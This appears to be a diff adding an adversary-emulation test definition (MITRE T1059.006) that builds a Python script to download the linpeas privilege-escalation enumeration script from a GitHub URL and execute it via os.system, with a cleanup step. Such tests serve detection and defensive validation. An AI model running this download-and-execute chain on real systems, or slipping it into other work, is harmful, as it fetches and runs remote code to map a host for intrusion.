@@ -1,0 +1,55 @@
+api_version: "2.0"
+name: Execute Python via scripts
+description: Create Python file (.py) that downloads and executes shell script via executor arguments
+args:
+    - name: script_args
+      type: string
+      default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles
+    - name: python_script_name
+      type: path
+      default: T1059.006.py
+    - name: script_url
+      type: string
+      default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
+    - name: payload_file_name
+      type: string
+      default: T1059.006-payload
+    - name: executor
+      type: string
+      default: sh
+uuid: 6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1059: Command and Scripting Interpreter'
+    subtechniques:
+        - 'T1059.006: Python'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: |
+        Requires Python
+      inline: |
+        which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
+        $which_python -c 'import requests' 2>/dev/null; echo $?
+      executor: sh
+    - name: execute-python-via-scripts
+      inline: |
+        which_python=$(which python || which python3 || which python3.9 || which python2)
+        echo 'import requests' > {{.Args.python_script_name}}
+        echo 'import os' >> {{.Args.python_script_name}}
+        echo 'url = "{{.Args.script_url}}"' >> {{.Args.python_script_name}}
+        echo 'malicious_command = "{{.Args.executor}} {{.Args.payload_file_name}} {{.Args.script_args}}"' >> {{.Args.python_script_name}}
+        echo 'session = requests.session()' >> {{.Args.python_script_name}}
+        echo 'source = session.get(url).content' >> {{.Args.python_script_name}}
+        echo 'fd = open("{{.Args.payload_file_name}}", "wb+")' >> {{.Args.python_script_name}}
+        echo 'fd.write(source)' >> {{.Args.python_script_name}}
+        echo 'fd.close()' >> {{.Args.python_script_name}}
+        echo 'os.system(malicious_command)' >> {{.Args.python_script_name}}
+        $which_python {{.Args.python_script_name}}
+      executor: sh
+      cleanup:
+        inline: "rm {{.Args.python_script_name}} {{.Args.payload_file_name}}  \n"
+        executor: sh
